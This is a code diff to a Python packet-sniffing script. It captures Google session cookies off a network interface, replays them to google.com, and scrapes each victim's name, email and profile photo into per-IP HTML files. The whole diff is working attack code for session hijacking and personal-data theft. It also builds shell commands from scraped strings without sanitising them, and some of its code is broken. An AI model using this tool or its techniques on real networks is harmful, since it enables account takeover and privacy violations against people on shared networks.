@@ -21,8 +21,6 @@ def subprocess_cmd(command):
     process = subprocess.Popen(command,stdout=subprocess.PIPE, shell=True)
     proc_stdout = process.communicate()[0].strip()
 
-
-
 def extract_google_stok(cookie):
 	session_tok = None;
 	cookie_toks = cookie.split(": ")[1].split("; ")
@@ -37,8 +35,6 @@ def extract_google_stok(cookie):
 
 def make_request(cookie, user_ip):
 
-	print "making user request"
-	
 	url = 'http://www.google.com/?gws_rd=ssl'
 	add_headers = {"Connection": "keep-alive", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.86 Safari/537.36", "Accept-Language": "en-US,en;q=0.8"}
 	add_headers["Cookie"] = cookie
@@ -50,16 +46,21 @@ def make_request(cookie, user_ip):
 	email_div = soup.findAll("div", { "class" : "gb_Db"})
 	email = email_div[0].text.split(" ")[0]
 	usr_img = resp.split("::before{content:url(//")[1].split(");")[0].replace("/s32","/s500")
+	img_file = user_ip.split(":")[0].replace(".","")+".jpg"
 
-	subprocess_cmd("mkdir -m 777 "+user_ip.split(":")[0])
-	subprocess_cmd("curl "+usr_img+" > ./"+user_ip.split(":")[0]+"/photo.jpg")
-	subprocess_cmd("echo "+name+" > ./"+user_ip.split(":")[0]+"/name.txt")
-	subprocess_cmd("echo "+email+" > ./"+user_ip.split(":")[0]+"/email.txt")
+
+	f = open("./client_files/"+user_ip.split(":")[0].replace(".","")+".html", "w")
+	f.write(name+"<br><br><br>")
+	f.write(email+"<br><br><br>")
+	f.write("<img src=\""+img_file+"\" alt=\"Smiley face\" height=\"42\" width=\"42\">")
+	subprocess_cmd("curl "+usr_img+" > ./client_files/"+img_file)
+	f.close()
+	# subprocess_cmd("echo "+name+" > ./"+user_ip.split(":")[0]+"/name.txt")
+	# subprocess_cmd("echo "+email+" > ./"+user_ip.split(":")[0]+"/email.txt")
 
 def extract_cookie(packet):
 
 	counter = counter+1
-	print counter
 	# provide access to globar variables
 	global counter
 	global session_ids
@@ -131,14 +132,10 @@ def extract_cookie(packet):
 					del user_complete[user_key]
 					del	user_packet[user_key]
 
-
 def main():
 	interface = sys.argv[1]
 	print interface
 	sniff(iface=interface, prn=extract_cookie)
-	# stream_object= open_capture(interface)
-	# stream_object.loop(-1, recieve_packets) # capture packets
-
 if __name__ == '__main__':
 	main()
 	
